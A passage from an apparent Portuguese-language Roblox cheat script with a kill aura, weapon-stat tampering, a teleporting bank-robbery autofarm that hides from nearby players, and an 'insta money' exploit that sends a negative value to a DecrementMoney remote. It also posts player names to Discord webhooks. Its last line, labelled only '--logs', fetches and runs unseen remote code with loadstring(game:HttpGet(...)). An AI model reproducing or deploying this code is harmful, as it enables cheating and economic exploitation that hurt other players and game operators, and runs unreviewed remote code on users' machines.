    })

    F3X:Toggle({
        Title = "Ativar seleção",
        Callback = function(v)
            Enabled = v
            if not v then clearSelection() end
        end
    })

    InfoParagraph = F3X:Paragraph({ Title = "Nenhuma parte selecionada.", Desc = "" })
    F3X:Space()

    InputX = F3X:Input({ Title = "X (largura)" })
    F3X:Space()
    local gx = F3X:Group()
    gx:Button({ Title = "-0.2", Callback = function() InputX:Set(tostring((tonumber(InputX.Value) or 0) - 0.2)) end })
    gx:Space()
    gx:Button({ Title = "+0.2", Callback = function() InputX:Set(tostring((tonumber(InputX.Value) or 0) + 0.2)) end })

    F3X:Space()

    InputY = F3X:Input({ Title = "Y (altura)" })
    F3X:Space()
    local gy = F3X:Group()
    gy:Button({ Title = "-0.2", Callback = function() InputY:Set(tostring((tonumber(InputY.Value) or 0) - 0.2)) end })
    gy:Space()
    gy:Button({ Title = "+0.2", Callback = function() InputY:Set(tostring((tonumber(InputY.Value) or 0) + 0.2)) end })

    F3X:Space()

    InputZ = F3X:Input({ Title = "Z (profundidade)" })
    F3X:Space()
    local gz = F3X:Group()
    gz:Button({ Title = "-0.2", Callback = function() InputZ:Set(tostring((tonumber(InputZ.Value) or 0) - 0.2)) end })
    gz:Space()
    gz:Button({ Title = "+0.2", Callback = function() InputZ:Set(tostring((tonumber(InputZ.Value) or 0) + 0.2)) end })

    F3X:Space()

    F3X:Button({
        Title = "Aplicar",
        Callback = function()
            applySize(Vector3.new(
                tonumber(InputX.Value),
                tonumber(InputY.Value),
                tonumber(InputZ.Value)
            ))
        end
    })

    F3X:Space()

    local gUR = F3X:Group()
    gUR:Button({ Title = "Undo", Callback = undo })
    gUR:Space()
    gUR:Button({ Title = "Redo", Callback = redo })

    F3X:Space()

    F3X:Paragraph({
        Title = "Sistema de salvamento",
        Desc = "Permite salvar, deletar e aplicar as configurações."
    })

    ConfigDropdown = F3X:Dropdown({
        Title = "Configs",
        Values = listConfigs(),
        Callback = function(v) SelectedConfig = v end
    })

    F3X:Input({
        Title = "Nome da configuração",
        Callback = function(v) CurrentConfigName = v end
    })

    F3X:Space()

    local gCFG = F3X:Group()
    gCFG:Button({ Title = "Salvar", Callback = function() saveConfig(CurrentConfigName) end })
    gCFG:Space()
    gCFG:Button({ Title = "Aplicar", Callback = function() applyConfig(SelectedConfig) end })
    gCFG:Space()
    gCFG:Button({ Title = "Deletar", Callback = deleteConfig })
end


-- tevez

if TEVEZ_MAPA then

do
local TevezApenas = Window:Section({
    Title = "[EB] Tevez",
    Desc = "Exclusivos do jogo",
    Icon = "lucide:gamepad-2",
    IconColor = Color3.fromHex("#1C3811")
})

-- KILL AURA

local GS = Replicated:WaitForChild("GunSystem")
local GC = GS:WaitForChild("GunsConfigurations")
local FireEvent = GS.Remotes.Events.Fire
local ReloadFunction = GS.Remotes.Functions.Reload

local Active = true
local Aura = false
local Blocker = false
local Connections = {}
local Tasks = {}
local LastTargetTime = 0

local function track(c) table.insert(Connections, c) end
local function trackTask(t) table.insert(Tasks, t) end
local function reg(target) LastTargetTime = tick() end

local function HasGun()
    local bp = Player:FindFirstChild("Backpack")
    local char = Player.Character

    for _, cfg in ipairs(GC:GetChildren()) do
        local n = cfg.Name
        if (bp and bp:FindFirstChild(n)) or (char and char:FindFirstChild(n)) then
            return true
        end
    end
    return false
end

-- Pega a info da arma
local function GetGun()
    local c = Player.Character
    if not c then return nil end

    local tool = c:FindFirstChildWhichIsA("Tool")
    if not tool then return nil end

    local cfgInstance = GC:FindFirstChild(tool.Name)
    if not cfgInstance then return nil end

    local ok, moduleTable = pcall(function() return require(cfgInstance) end)
    if ok and type(moduleTable) == "table" then
        return moduleTable, tool.Name
    end

if type(getgc) == "function" then
    for _, v in ipairs(getgc()) do
        if type(v) == "table" and rawget(v, "BackCFrame") and rawget(v, "Damage") then
            if rawget(v, "Name") == tool.Name or rawget(v, "Title") == tool.Name then
                return v, tool.Name
            end
        end
    end
end

return nil, tool.Name
end

-- Modifica os values da arma
local function ModifyGun(prop, val)
    local cfg, gunName = GetGun()
    if not cfg then
        Notify("Erro", "Não foi possível obter configuração da arma.")
        return
    end

-- Check da propriedade
    if rawget(cfg, prop) == nil then
        Notify("Erro", "Propriedade '"..tostring(prop).."' não existe nesta arma.")
        return
    end

    rawset(cfg, prop, val)
end

-- Recarregar
trackTask(task.spawn(function()
    while task.wait(0.25) do
        if not Active or not Aura or not HasGun() then continue end
        local c = Player.Character
        if not c then continue end

        local tool = c:FindFirstChildWhichIsA("Tool")
        if not tool then continue end

        pcall(function()
            ReloadFunction:InvokeServer(tool)
        end)
    end
end))

-- Kill aura
trackTask(task.spawn(function()
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude

    while Active do
        if Aura and HasGun() and Player.Character then
            local c = Player.Character
            local tool = c:FindFirstChildWhichIsA("Tool")

            if tool then
                local cfgInstance = GC:FindFirstChild(tool.Name)
                if cfgInstance then
                    local cfgData = (pcall(function() return require(cfgInstance) end) and require(cfgInstance)) or nil
                    local firePart = tool:FindFirstChild("FirePart") or tool:FindFirstChild("Handle") or tool.PrimaryPart
                    if firePart then
                        rp.FilterDescendantsInstances = {Player.Character}

                        local target, dist = nil, math.huge

                        for _, plr in ipairs(Players:GetPlayers()) do
                            if plr ~= Player and plr.Team ~= Player.Team and plr.Character then
                                local h = plr.Character:FindFirstChildOfClass("Humanoid")
                                if h and h.Health > 0 then
                                    local head = plr.Character:FindFirstChild("Head") or plr.Character:FindFirstChild("HumanoidRootPart")
                                    if head then
                                        local d = (head.Position - firePart.Position).Magnitude
                                        if d < dist then
                                            dist = d
                                            target = head
                                        end
                                    end
                                end
                            end
                        end

                        if target then
                            local direction = target.Position - firePart.Position
                            local result = workspace:Raycast(firePart.Position, direction.Unit * direction.Magnitude, rp)

                            local hitPos = (result and result.Position) or target.Position
                            local info = {
                                [target] = {
                                    Normal   = (result and result.Normal) or Vector3.new(0,1,0),
                                    Position = hitPos,
                                    Instance = target,
                                    Distance = direction.Magnitude,
                                    Material = (result and result.Material) or Enum.Material.ForceField
                                }
                            }

                            pcall(function()
                                FireEvent:FireServer(tool, info, hitPos)
                            end)

                            reg(target.Parent)
                        end
                    end
                end
            end
        end

        task.wait()
    end
end))

-- UI MODS TEVEZ

do
    local TevezMods = TevezApenas:Tab({
        Title = "Mods",
        Icon = "lucide:chevrons-left-right-ellipsis",
        IconColor = Color3.fromHex("#C012FF")
    })

    local SectionKillAura = TevezMods:Section({
        Title = "Kill Aura"
    })

    SectionKillAura:Paragraph({
        Title = "Kill Aura [RISCO DE BAN]",
        Color = Color3.fromHex("#FF1D0D"),
        Desc = "Enquanto estiver com a arma, mata todos os inimigos ao redor de você. Não mata inimigos em safezones.",
    })

local KillAuraToggle

SectionKillAura:Toggle({
    Title = "Permitir",
    Desc = "O uso de kill aura é de sua conta e risco, você será banido caso for denunciado. Use uma alt.",
    Callback = function(state)
        if state then
            KillAuraToggle:Unlock()
            Notify("Permissão", "Concedida")
        else
            KillAuraToggle:Set(false) 
            
            KillAuraToggle:Lock()
            Notify("Permissão", "Negada.")
        end
    end
})

KillAuraToggle = SectionKillAura:Toggle({
    Title = "Kill-aura [RISCO DE BAN]",
    Callback = function(state)
        if state then
            if not HasGun() then
                Blocker = true
                KillAuraToggle:Set(false)
                Notify("Erro", "Você precisa de uma arma.")
                return
            end
            Aura = true
            Blocker = false
            Notify("Script", "[KILL-AURA] Ativado")
        else
            Aura = false
            Notify("Script", "[KILL-AURA] Desativado")
        end
    end
})

KillAuraToggle:Lock()


    SectionKillAura:Space()

local SectionArma = TevezMods:Section({
        Title = "Arma"
    })

local ItensLoja = {
    ["AK-47"] = 15000,
    ["MPT-76"] = 8500,
    ["UZI"] = 8200,
    ["M4A1"] = 13000,
    ["GLOCK 18"] = 4300,
    ["Colete"] = 15000
}

local DropdownValues = {}
local DisplayToItem = {}

for nome, preco in pairs(ItensLoja) do
    local display = nome .. " - $" .. preco
    table.insert(DropdownValues, display)
    DisplayToItem[display] = nome
end

local ItemSelecionado = "GLOCK 18"

SectionArma:Dropdown({
    Title = "Comprar itens",
    Desc = "Compra um item na loja de civil",
    Values = DropdownValues,
    Value = "GLOCK 18 - $4300",
    Callback = function(option)
        ItemSelecionado = DisplayToItem[option]
    end
})

SectionArma:Button({
    Title = "Comprar",
    Callback = function()
        if not ItemSelecionado then return end

        local args = {
            "Buy",
            ItemSelecionado
        }

        game:GetService("ReplicatedStorage")
            :WaitForChild("Assets")
            :WaitForChild("Remotes")
            :WaitForChild("ToolsShop")
            :FireServer(unpack(args))

        Notify("Loja", "Item comprado: " .. ItemSelecionado)
    end
})

SectionArma:Space()

    local bulletsValue = nil
    local spreadValue  = nil
    local rangeValue   = nil

    SectionArma:Paragraph({
        Title = "Bullets",
        Desc = "Modifica a quantidade de balas que saem da arma por disparo. Além disso, multiplica o dano por hit.",
    })

    SectionArma:Input({
        Title = "Bullets",
        Placeholder = "Valor",
        Callback = function(v)
if v == "" then return end
            local n = tonumber(v)
            bulletsValue = n
            if n then
                Notify("Bullets", "Valor: "..tostring(n))
            else
                Notify("Bullets", "Inválido")
            end
        end
    })
    SectionArma:Space()

    SectionArma:Paragraph({
        Title = "Spread",
        Desc = "Controla a dispersão dos tiros. Quanto maior, mais espalhado os tiros sairão da arma. Quanto menor, mais juntas as balas ficarão.",
    })

    SectionArma:Input({
        Title = "Spread",
        Placeholder = "Valor",
        Callback = function(v)
            local n = tonumber(v)
if v == "" then return end
            spreadValue = n
            if n then
                Notify("Spread", "Valor: "..tostring(n))
            else
                Notify("Spread", "Inválido")
            end
        end
    })
    SectionArma:Space()

    SectionArma:Paragraph({
        Title = "Range",
        Desc = "Distância pela qual o disparo consegue chegar.",
    })

    SectionArma:Input({
        Title = "Range",
        Placeholder = "Valor",
        Callback = function(v)
            local n = tonumber(v)
if v == "" then return end
            rangeValue = n
            if n then
                Notify("Range", "Valor: "..tostring(n))
            else
                Notify("Range", "Inválido")
            end
        end
    })
    SectionArma:Space()

    SectionArma:Paragraph({
        Title = "Aplicar mods",
        Desc = "Aplica as modificações na arma equipada.",
    })

    SectionArma:Button({
        Title = "Aplicar mods",
        Callback = function()
            if not HasGun() then
                Notify("Erro", "Equipe uma arma para modificar.")
                return
            end
            if bulletsValue then ModifyGun("Bullets", bulletsValue) end
            if spreadValue then ModifyGun("Spread", spreadValue) end
            if rangeValue then ModifyGun("Range", rangeValue) end
            Notify("Mods", "Aplicações feitas.")
        end
    })
end


-- =========================
-- Autofarm LÓGICA
-- =========================
_G.AutoFarm = false

local cfg = ...
local ModoSeguro = (cfg and cfg.ModoSeguro) or false
local RaioDeSeguranca = (cfg and cfg.ModoSeguro) or 60

local PS = game:GetService("Players")
local WS = game:GetService("Workspace")
local RS = game:GetService("ReplicatedStorage")

local plr = PS.LocalPlayer
local char, root, bag

local bank = WS.Map.Robbery.Bank
local status = bank.RobberyStatus.SurfaceGui.BankStatus
local CollectPos = bank.CollectPad.Position 

local Remotes = RS.Assets.Remotes
local BuyShop = Remotes.BuyShop
local Robbery = Remotes.Robbery

local rodando = false
local ultimaVenda = 0
local DinheiroInicial = 0
local DinheiroFarmado = 0
local MIN_MONEY_REQUIRED = 1300

local FarmStatus

local AFK_DISTANCE = 10
local AFK_LEFT_POS = CollectPos - Vector3.new(AFK_DISTANCE, 0, 0)
local AFK_RIGHT_POS = CollectPos + Vector3.new(AFK_DISTANCE, 0, 0)
local AFK_SPEED = 0.02

local Kaio = WS.Map.NPCS.Kaio
local VENDER_POS = Kaio.HumanoidRootPart.Position - Vector3.new(9, 10, 0) 

local seguro
local aberto
local fechado

local function UpdateStatus(msg)
    if FarmStatus and FarmStatus.SetDesc then 
        FarmStatus:SetDesc("✌️ Status: " .. msg .. "\n💰 Farmado total: R$ " .. tostring(DinheiroFarmado))
    end
end


local function tp(v)
	if char and root then
		char:PivotTo(CFrame.new(v))
	end
end

local function esperaDinamica(delayTime)
    delayTime = delayTime or 0
    
    local startTime = tick()
    
    while aberto() and _G.AutoFarm and (tick() - startTime < delayTime) do
        
        if seguro() then 
            task.wait(0.1) 
            continue 
        end
        
        tp(AFK_LEFT_POS + Vector3.new(0, 4, 0))
        task.wait(AFK_SPEED)

        tp(AFK_RIGHT_POS + Vector3.new(0, 4, 0))
        task.wait(AFK_SPEED)
    end
    
    return not aberto() or not _G.AutoFarm
end


local function ref()
	char = plr.Character or plr.CharacterAdded:Wait()
	root = char:WaitForChild("HumanoidRootPart")
	bag  = plr:WaitForChild("Backpack")
end
ref()


local function item(n)
	local b = plr:FindFirstChild("Backpack")
	return (b and b:FindFirstChild(n)) or (char and char:FindFirstChild(n))
end

-- Definições de status
aberto = function()
	return status.Text == "ABERTO"
end

fechado = function()
    return status.Text == "FECHADO"
end


local function spin()
	char:PivotTo(root.CFrame * CFrame.Angles(0, math.rad(30), 0))
end

local function dinheiro()
	for _,v in ipairs(WS:GetDescendants()) do
		if v.Name == "Money Bag" then
			local h = v:FindFirstChildWhichIsA("BasePart")
			if not h then continue end
			local att = h:FindFirstChild("DataAttachment")
			if not att then continue end
			local gui = att:FindFirstChild("BillboardGui")
			if not gui then continue end
			local l = gui.Frame:FindFirstChild("Money")
			if l then return tonumber(l.Text:match("%d+")) or 0 end
		end
	end
	return 0
end

-- Definição de seguro (que usa 'aberto' e 'fechado')
seguro = function()
	if not ModoSeguro then return false end
	if not root then return false end
    if not _G.AutoFarm or fechado() then return false end 

	for _,p in ipairs(PS:GetPlayers()) do
		if p ~= plr and p.Character then
			local hrp = p.Character:FindFirstChild("HumanoidRootPart")
			if hrp and (hrp.Position - root.Position).Magnitude <= RaioDeSeguranca then
				UpdateStatus("MODO SEGURO: Há algum player por perto. Aguardando...")
                
                tp(AFK_LEFT_POS + Vector3.new(0, 4, 0)) 
                
				repeat
					task.wait(0.4)
				until not _G.AutoFarm or fechado()
				or not hrp
				or (hrp.Position - root.Position).Magnitude > RaioDeSeguranca
                
                if not _G.AutoFarm or fechado() then 
                    UpdateStatus("Farm interrompido (Modo Seguro/Banco Fechado)")
                    return true 
                end

				UpdateStatus("Retomando farm...")
				return true 
			end
		end
	end

	return false
end

local c4Comprada = false
local BUY_POS = Vector3.new(-766, 19, -365)

local function tentarComprarC4()
	if c4Comprada then return true end
	if item("C4") then c4Comprada = true return true end
	UpdateStatus("Comprando C4...")
	tp(BUY_POS)
	task.wait(1)
	BuyShop:FireServer("C4")
	-- Reduzido o número de loops para ser mais eficiente
	for i = 1, 15 do
		if item("C4") then
			c4Comprada = true
			return true
		end
		task.wait(0.1)
	end
	return false
end

local function vender(forceSell)
	UpdateStatus("Entregando...")
    
	if not forceSell and (seguro() or fechado()) then return end 
    if not _G.AutoFarm then return end
    
    -- Teleporta para a posição de venda (Kaio)
	tp(VENDER_POS) 
	task.wait(0.5) 
    
    -- Loop de venda
	while dinheiro() > 0 and _G.AutoFarm do 
        -- Mantemos a verificação de segurança
		if seguro() then break end 
        
        -- Se não for venda forçada, para se o banco fechar durante a venda
        if not forceSell and fechado() then break end 
        
		Robbery:FireServer("Payment")
		task.wait(1) 
	end
    
    if not _G.AutoFarm then return end

	task.wait(0.5)
	tp(CollectPos)
	task.wait(0.1)
	esperaDinamica(0.5) 
	local saldoAtual = plr.leaderstats.Dinheiro.Value
	DinheiroFarmado = saldoAtual - DinheiroInicial
	UpdateStatus("Sucesso!")
end


local function farm()
    if rodando or not _G.AutoFarm then return end 
    
    if plr.leaderstats.Dinheiro.Value < MIN_MONEY_REQUIRED then
        UpdateStatus("Erro: Necessário $" .. MIN_MONEY_REQUIRED .. " para comprar C4.")
        rodando = false
        return
    end

    rodando = true

    task.spawn(function()
        if not aberto() then
            UpdateStatus("Esperando o banco abrir...")
            repeat task.wait(0.2) until aberto() or not _G.AutoFarm 
            if not _G.AutoFarm then rodando = false return end
        end

        UpdateStatus("Banco abriu! Indo comprar a C4...")

		c4Comprada = false
		if not tentarComprarC4() or not _G.AutoFarm or fechado() then 
            UpdateStatus("Erro: Não foi possível comprar C4 ou farm parado.")
            rodando = false
            return
        end

		local c4 = item("C4")
		if c4 then char.Humanoid:EquipTool(c4) end

		local prompt = bank.BankVault.C4.Handle:FindFirstChildOfClass("ProximityPrompt")
		local vaultPos = bank.BankVault.Vault.Front.Position

		local function usarC4AteSumir()
		    UpdateStatus("Plantando a C4...")
		    while aberto() and _G.AutoFarm do 
		        if seguro() then continue end
		        local c4Tool = item("C4")
		        if not c4Tool then
		            break
		        end
		        fireproximityprompt(prompt)
		        task.wait(0.15)
		    end
		end

		tp(vaultPos)
		task.wait(1)
        
        if not _G.AutoFarm or fechado() then rodando = false return end 
        
		usarC4AteSumir()
        
		if not _G.AutoFarm or fechado() then rodando = false return end 
        
		esperaDinamica(11) 
        
		while aberto() and _G.AutoFarm do 

			if seguro() then continue end

			if dinheiro() >= 4000 then
				task.wait(8)
				vender()
                if not aberto() or not _G.AutoFarm then break end 
			else
				UpdateStatus("Coletando dinheiro...")
				tp(CollectPos)
				task.wait(0.05)
				spin()
                
				if char.Humanoid.Health < 50 then
					UpdateStatus("Curando...")
					tp(AFK_LEFT_POS + Vector3.new(0, 4, 0))
                    
					repeat task.wait(0.2) until char.Humanoid.Health >= 90 or not _G.AutoFarm or fechado() 
                    if not _G.AutoFarm or fechado() then break end 
				end
                
                esperaDinamica(0.5)
                
                if not aberto() or not _G.AutoFarm then break end 
			end
		end

		rodando = false 
	end)
end

plr.CharacterAdded:Connect(function()
	task.wait(0.3)
	ref()
	if _G.AutoFarm and aberto() then
		UpdateStatus("Você morreu. Reiniciando farm")
		farm() 
	end
	char:WaitForChild("Humanoid").Died:Connect(function()
		rodando = false
		ref()
		task.wait(1)
		if _G.AutoFarm and aberto() then
			tp(CollectPos)
            tp(AFK_LEFT_POS + Vector3.new(0, 4, 0))
			farm()
		end
	end)
end)


status:GetPropertyChangedSignal("Text"):Connect(function()
	if not _G.AutoFarm then 
        rodando = false 
        return 
    end
    
	if status.Text == "ABERTO" then
		farm()
		return
	end
    
	if status.Text == "FECHADO" then
        
		local agora = tick()
		if agora - ultimaVenda < 5 then 
            rodando = false
            return 
        end
		ultimaVenda = agora
        
		task.spawn(function()
			-- task.wait(3) removido para reagir imediatamente ao fechamento
			
			if not _G.AutoFarm then return end
			local d = dinheiro()
			if d > 0 and _G.AutoFarm then 
				-- Chama a venda passando 'true' para forçar a execução (forceSell)
				vender(true) 
			end
		end)
        
        rodando = false
	end
end)

plr.CharacterAdded:Connect(function()
	task.wait(0.5)
	ref()
end)


local Cash = TevezApenas:Tab({
    Title = "Autofarm",
    Icon = "lucide:wallet",
    IconColor = Color3.fromHex("#03FF20")
})

FarmStatus = Cash:Paragraph({
    Title = "",
    Desc = "",
    Color = "Green",
    Image = "",
    ImageSize = 30,
    Thumbnail = "",
    ThumbnailSize = 80,
    Locked = false,
    Buttons = {}
})

FarmStatus:SetTitle("Status do Autofarm")
UpdateStatus("Aguardando...")

local AutofarmToggle = Cash:Toggle({
    Title = "Autofarm",
    Desc = "Ativa ou desativa o autofarm.",
    Callback = function(v)
        _G.AutoFarm = v

        if v then
            if plr.leaderstats.Dinheiro.Value < MIN_MONEY_REQUIRED then
                Notify("Erro", "Necessário R$" .. MIN_MONEY_REQUIRED .. " para iniciar o autofarm.")
                AutofarmToggle:Set(false) 
                _G.AutoFarm = false
                return
            end
            
            rodando = false
            DinheiroInicial = plr.leaderstats.Dinheiro.Value
            DinheiroFarmado = 0
            UpdateStatus("Autofarm iniciado")
            farm() 
        else
            UpdateStatus("Autofarm desativado")
            rodando = false 
        end
    end
})
Cash:Space()

Cash:Toggle({
    Title = "Modo seguro",
    Desc = "Interrompe o autofarm caso alguém esteja a uma X distância de você.",
    Callback = function(v)
        ModoSeguro = v
        Notify("Modo Seguro", v and "Ativado" or "Desativado")
    end
})

Cash:Input({
    Title = "Raio de segurança",
    Desck = "Se alguém estiver dentro desse raio, interromperá o autofarm até que não haja ninguém nesse mesmo raio.",
    Placeholder = "Ex: 100 (seguro)",
    Callback = function(v)
        if v == "" then return end
        local n = tonumber(v)
        if not n then
            Notify("Erro", "Digite um número válido.")
            return
        end
        RaioDeSeguranca = n
        Notify("NOVO VALOR", ""..tostring(n))
    end
})
end -- Section do Tevez
end -- Tab do tevez


if DELTA_MAPA then
do
	local DeltaApenas = Window:Section({
		Title = "[EB] Delta",
		Desc = "Exclusivos do jogo",
		Icon = "lucide:gamepad-2",
		IconColor = Color3.fromHex("#1C3811")
	})

	local DeltaInfinito = DeltaApenas:Tab({
		Title = "Insta money",
		Icon = "lucide:infinity",
		IconColor = Color3.fromHex("#12E038"),
		Locked = false,
	})

	local Button = DeltaInfinito:Button({
		Title = "Receber",
		Desc = "Você ficará com o dinheiro máximo (1 milhão). Ao executar, você dará rejoin.",
		Locked = false,
		Callback = function()
			local args = {
	-1000000,
	"BuyMilitaryPass"
}
game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Events"):WaitForChild("Economy"):WaitForChild("DecrementMoney"):FireServer(unpack(args))

			task.defer(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
			end)
		end
	})
end
end

local Outros = Window:Section({
    Title = "Outros",
})

-- =========================
-- 10) DISCORD
-- =========================
do
    local InviteCode = "michigun"
    local DiscordAPI = "https://discord.com/api/v10/invites/" .. InviteCode .. "?with_counts=true&with_expiration=true"

    local Response = WindUI.cloneref(game:GetService("HttpService")):JSONDecode(WindUI.Creator.Request({
        Url = DiscordAPI,
        Method = "GET",
        Headers = {
            ["User-Agent"] = "WindUI/Example",
            ["Accept"] = "application/json"
        }
    }).Body)

    local DiscordTab = Outros:Tab({
    Title = "Comunidade",
    Icon = "geist:logo-discord",
    IconColor = Blue
})

if Response and Response.guild then
    DiscordTab:Section({
        Title = "Entre no Discord!",
        TextSize = 30,
    })

    DiscordTab:Paragraph({
        Title = tostring(Response.guild.name),
        Desc = "Servidor oficial do michigun.xyz",
        Image = "https://cdn.discordapp.com/icons/" .. Response.guild.id .. "/" .. Response.guild.icon .. ".png?size=1024",
        Thumbnail = "https://cdn.discordapp.com/attachments/1460824919758868501/1460825713694474459/avatar.png?ex=69685376&is=696701f6&hm=c51ba032a92649e7cf903e63048f23c8d6270f4615722719e29ba1e536564bc5&",
        ImageSize = 100,
        Buttons = {
            {
                Title = "Copiar link!",
                Icon = "link",
                Callback = function()
                    setclipboard("https://discord.gg/" .. InviteCode)
                end
            }
        }
    })
end
end


-- =========================
-- 11) Sugestões
-- =========================

do
local Sugestoes = Outros:Tab({ Title = "Sugestões", Icon = "lucide:message-circle", IconColor = Yellow })

local requestFunc = syn and syn.request or request or http_request
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()

-- ======================================================
--  CONFIG
-- ======================================================

local COOLDOWN_SUGESTAO  = 1800      -- 30 min
local COOLDOWN_AVALIACAO = 21600     -- 6h

-- Arquivo persistente para armazenar timestamps
local fileName = "v" .. tostring(HWID) .. ".json"

local Saved = {
    sugestao  = 0,
    avaliacao = 0
}

-- ======================================================
--  ARQUIVOS
-- ======================================================

local function Save()
    writefile(fileName, HttpService:JSONEncode(Saved))
end

local function Load()
    if not isfile(fileName) then
        Save()
        return
    end
    
    local ok, data = pcall(function()
        return HttpService:JSONDecode(readfile(fileName))
    end)

    if ok and typeof(data) == "table" then
        Saved = data
    end
end

Load()

-- ======================================================
--  ENVIAR PARA WEBHOOK
-- ======================================================

local WEBHOOK_AVALIACAO = "https://rbxhook.cc/r/cc3ff315c0a81e4a0c4187195b3388ed"
local WEBHOOK_SUGESTAO  = "https://rbxhook.cc/r/5b1667a03cf9b0dcdfce0bb5144bf58b"

local function isoTimestamp()
    return os.date("!%Y-%m-%dT%H:%M:%S.000Z")
end

local function EnviarPayload(isSug, texto, nota, anonimo)
    local hook = isSug and WEBHOOK_SUGESTAO or WEBHOOK_AVALIACAO
    local nome = anonimo and "Anônimo" or player.Name

    local embed = {
        title = (isSug and "Sugestão feita por: " .. nome or "Avaliação feita por: " .. nome),
        description = isSug 
            and ("\n> **" .. texto .. "**\n")
            or ("Nota: **" .. nota .. "/10**\n\n> **" .. texto .. "**\n"),
        timestamp = isoTimestamp(),
        color = 14280458
    }

    requestFunc({
        Url = hook,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode({
            username = isSug and "Sugestão" or "Avaliação",
            embeds = { embed }
        })
    })
end

-- ======================================================
--  SUGESTÃO
-- ======================================================

local sugestao = Sugestoes:Section({ Title = "Sugestão? Envie-me!" })

local anonimatoSug = false
sugestao:Toggle({
    Title = "Anonimato",
    Default = false,
    Callback = function(v) anonimatoSug = v end
})

local sugestaoBox = sugestao:Input({
    Title = "Sua sugestão",
    Type = "Textarea",
    Icon = "mouse",
})

sugestao:Button({
    Title = "Enviar",
    Callback = function()
        local now = os.time()

        -- COOLDOWN
        if now < Saved.sugestao then
            local rest = Saved.sugestao - now
            Notify("COOLDOWN!", "Você só pode enviar outra sugestão em " .. rest .. " segundos.")
            return
        end

        if sugestaoBox.Value == "" then
            Notify("Erro", "Digite algo antes de enviar.")
            return
        end

        -- atualiza o cooldown
        Saved.sugestao = now + COOLDOWN_SUGESTAO
        Save()

        EnviarPayload(true, sugestaoBox.Value, nil, anonimatoSug)
        Notify("Obrigada!", "Sugestão enviada.")
    end
})

-- ======================================================
--  AVALIAÇÃO
-- ======================================================

local avaliar = Sugestoes:Section({ Title = "Avalie!" })

local anonimatoAval = false
avaliar:Toggle({
    Title = "Anonimato",
    Default = false,
    Callback = function(v) anonimatoAval = v end
})

local avaliarNota = "10"
avaliar:Dropdown({
    Title = "Nota",
    Desc = "Escolha a nota",
    Values = { "1","2","3","4","5","6","7","8","9","10" },
    Value = "10",
    Callback = function(v) avaliarNota = v end
})

local avaliarBox = avaliar:Input({
    Title = "Avaliação",
    Type = "Textarea",
    Icon = "mouse",
})

avaliar:Button({
    Title = "Enviar",
    Callback = function()
        local now = os.time()

        -- COOLDOWN
        if now < Saved.avaliacao then
            local rest = Saved.avaliacao - now
            Notify("Espere!", "Você só pode enviar outra avaliação em " .. rest .. " segundos.")
            return
        end

        if avaliarBox.Value == "" then
            Notify("Erro", "Escreva sua avaliação antes de enviar.")
            return
        end

        -- atualiza o cooldown
        Saved.avaliacao = now + COOLDOWN_AVALIACAO
        Save()

        EnviarPayload(false, avaliarBox.Value, avaliarNota, anonimatoAval)
        Notify("Agradeço!", "Avaliação enviada.")
    end
})
end

-- Configurações

local configuracoes = Window:Tab({ Title = "Configurações", Icon = "geist:settings-gear", IconColor = Grey })
	
local Toggle = configuracoes:Toggle({
    Title = "Botão flutuante",
    Desc = "Ativa o botão flutuante de abrir o menu.",
    Icon = "",
    Type = "Checkbox",
    Value = true,
    Callback = function(state)
        Window:EditOpenButton({
            Enabled = state
        })
    end
})
	
configuracoes:Input({
    Title = "Palavra secreta",
    Desc = "Palavra ou frase que será digitada no chat para abrir / fechar a UI. Padrão: /e",
    Placeholder = "Ex: /e",
    Callback = function(v)
if v == "" then return end
        local has_space = string.find(v or "", "%s")
        local is_empty = string.len(v or "") == 0
        
        if not is_empty and not has_space then
            SecretWord = v
            setupChatToggle()
            Notify("Palavra Secreta", "Definida para: " .. v .. " para abrir a UI.")
        else
            -- Notificação de erro
            Notify("Erro", "A palavra secreta não pode ser vazia nem conter espaços.")
            
            SecretWord = "/e"
            setupChatToggle()
            Notify("Palavra Secreta", "Resetada para: /e")
        end
    end
})


local KeybindKey = Enum.KeyCode.Z 
local KeybindConnection = nil 
local KeybindInitialized = false -- Novo controle de inicialização

local function setupKeybind()
    if KeybindConnection then
        KeybindConnection:Disconnect()
        KeybindConnection = nil
    end

    KeybindConnection = UIS.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end

        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == KeybindKey then
            
            Window:Toggle()
        end
    end)
    
    if KeybindInitialized then
        Notify("Keybind", "Keybind definida para: " .. tostring(KeybindKey))
    end
end


configuracoes:Input({
    Title = "Keybind",
    Desc = "Tecla para abrir e fechar a UI (Apenas letras).",
    Flag = "Config_Keybind",
    Placeholder = tostring(KeybindKey),
    Callback = function(v)
        local keyName = string.upper(string.gsub(v or "", "%s+", ""))
        
        if string.len(keyName) == 0 then
            Notify("Erro", "A Keybind não pode ser vazia.")
            return
        end

        local success, newKeybind = pcall(function()
            return Enum.KeyCode[keyName]
        end)

        if success and newKeybind then
            KeybindKey = newKeybind
            setupKeybind()
            KeybindInitialized = true
        else
            Notify("Erro", "Tecla '" .. keyName .. "' inválida. Use apenas letras (A-Z).")
        end
    end
})


do
    local TestSection = Window:Section({
        Title = "Feito com carinho",
        Icon = "geist:heart",
        IconColor = Color3.fromHex("#fA1616")
    })
end


loadstring(game:HttpGet("https://raw.githubusercontent.com/M0vi/k/refs/heads/main/k"))()
--logs 
